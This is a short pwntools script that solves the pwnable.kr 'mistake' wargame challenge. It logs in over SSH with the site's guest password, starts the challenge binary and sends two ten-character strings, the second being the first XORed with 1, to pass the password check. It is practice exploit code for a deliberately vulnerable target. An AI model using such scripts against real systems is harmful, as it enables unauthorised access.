from pwn import *
#context.log_level='debug'

s = ssh('mistake','pwnable.kr',port=2222,password='guest')
p = s.process('./mistake')


payload1 = 'A'*10
payload2 = '@' * 10

p.sendline(payload1)
p.sendline(payload2)

p.interactive()
